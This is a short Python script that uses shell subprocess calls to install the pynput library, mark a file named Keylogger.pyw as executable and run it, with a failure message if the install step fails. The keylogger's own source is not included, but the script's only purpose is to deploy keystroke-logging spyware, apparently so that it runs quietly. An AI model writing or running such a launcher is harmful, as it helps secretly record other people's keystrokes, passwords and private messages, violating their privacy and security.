import subprocess


cmds = ["pip install pynput", "chmod +x Keylogger.pyw", "python Keylogger.pyw"]

p2 = subprocess.Popen(cmds[0], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
p2.wait()

if p2.returncode == 0:
    p3 = subprocess.Popen(cmds[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    p3.wait()

    p4 = subprocess.Popen(cmds[2], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    p4.wait()

else:
    print("\nRequirements | Failed ✘ ")
